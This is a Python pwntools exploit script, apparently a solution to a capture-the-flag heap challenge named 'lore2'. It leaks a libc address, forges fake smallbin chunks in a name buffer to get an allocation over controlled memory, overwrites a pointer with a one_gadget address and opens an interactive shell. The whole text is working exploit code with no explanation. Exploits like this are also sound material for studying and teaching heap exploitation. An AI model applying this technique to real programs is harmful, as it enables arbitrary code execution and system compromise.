from pwn import *

def add(size, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)

def delete(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())

def show(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx: ", str(idx).encode())
    addr = int(p.recvuntil(b":")[:-1], 16)
    data = p.recvline().strip()
    return addr, data

def edit(idx, data):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendafter(b"Data: ", data)

def edit_name(data):
    p.sendlineafter(b"> ", b"5")
    p.sendafter(b"Name: ", data)

p = process("./lore2")
e = ELF("./lore2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p.sendlineafter(b"name: ", b"AAAA")
name_addr = int(p.recvuntil(b":")[:-1], 16)

add(0x100, b"AAAA") # 0
add(0x100, b"AAAA") # 1
add(0x100, b"AAAA") # 2

delete(0) # unsortedbin : 0
add(0x110, b"AAAA") # smallbin : 0 (victim)

chunk_addr, main_arena = show(0)
main_arena = u64(main_arena+b"\x00\x00")
libc_base = main_arena - 0x3c4b20 - 0x158
og = libc_base + 0xf1247
print(hex(libc_base), hex(chunk_addr))

# size : 0x111, Fakechunk1->fd = victim, Fakechunk1->bk = Fakechunk2
fakechunk = b"\x00"*8 + p64(0x111) + p64(chunk_addr-0x10) + p64(name_addr + 0x20)
# Fakechunk2->fd = Fakechunk1
fakechunk += p64(0) + p64(0) + p64(name_addr) # bk
edit_name(fakechunk)
payload = b"A"*8 + p64(name_addr)
edit(0, payload)
add(0x100, b"AAAA")

payload = b"A"*104 + p64(og)
add(0x100, payload)

p.sendlineafter(b"> ", b"6")
p.interactive()